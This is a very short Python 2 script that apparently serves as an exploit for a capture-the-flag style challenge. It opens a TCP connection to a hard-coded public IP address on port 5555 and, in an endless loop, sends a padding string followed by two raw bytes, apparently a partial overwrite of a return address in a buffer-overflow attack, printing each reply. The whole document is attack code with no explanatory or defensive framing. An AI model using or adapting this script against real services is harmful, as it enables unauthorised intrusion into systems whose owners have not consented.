#!/usr/bin/python
import socket
HOST='115.28.79.166'
PORT=5555
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((HOST,PORT))
while 1:
    data='aaaaaaaa\x86\x07'
    s.sendall(data)     
    data=s.recv(1024) 
    print data     
s.close() 

#print 1
#print 'aaaaaaaa\x86\x07'

